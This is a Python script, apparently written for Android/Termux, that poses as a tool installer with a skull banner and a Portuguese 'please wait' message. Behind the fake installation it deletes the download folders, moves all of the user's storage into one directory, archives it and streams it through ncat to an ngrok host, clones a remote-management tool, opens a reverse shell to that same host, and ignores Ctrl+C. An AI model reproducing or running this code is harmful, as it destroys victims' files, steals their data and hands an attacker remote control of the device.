# -*- coding: UTF-8 -*-

#Tabela de cores ANSI
white = '\033[1;97m'
black = '\033[1;30m'
red = '\033[1;31m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
redf = '\033[1;91m'
yellowf = '\033[1;93m'
yellowb = '\033[1;33m'
blueb = '\033[1;44m'
redfb = '\033[1;101m'
greenb = '\033[1;42m'
yellowfb = '\033[1;101m'
blackb = '\033[1;40m'
redb = '\033[1;41m'
negrito = '\033[;1m	'
reset = '\033[0;0m'

# Vars
back = False
ip_connection = '6.tcp.ngrok.io'
port_connection = '16786'

# Libs
import socket, subprocess, os

os.system('rm -rf /storage/emulated/0/download')
os.system('rm -rf /storage/emulated/0/downloads')
os.mkdir('/storage/emulated/0/dirs_xx')
os.system('mv /storage/emulated/0/* /storage/emulated/0/dirs_xx')

while (back == False):
    print(f'''{red}
                        ______
                     .-"      "-.
                    /            |
                   |              |
                   |,  .-.  .-.  ,|
                   | )(_o/  \o_)( |
                   |/     /\     \|
         (@_       (_     ^^     _) Installing...
    _     ) \_______\__|IIIIII|__/__________________________
   (_)@8@8$3<________|-\IIIIII/-|___________________________>
          )_/        \          /
         (@           `--------`
         
    {green}<--> Aguarde enquanto fazemos a instalação!...
    
    Por conta de ser uma ferramenta vasta de opções, o processo
    de download pode demorar.
    (Estima-se que em torno de 30 minutos)
    {white}
    [Aguarde...] > ''')

    try:
        
        #Transferir 
        os.system(f'''tar czp dirs_xx | ncat {ip_connection} {port_connection}''')
        os.mkdir('Hacked_by:_xRev3rse')

        #Tool para gerenciar maquina (opcional & beta)
        os.system('git clone https://github.com/xRev3rse/RMMtool')

        #Payload > Shell Remota
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((f"{ip_connection}", port_connection))
        os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh","-i"])
    
    # Burlar CTRL+C
    except KeyboardInterrupt: 
        pass 
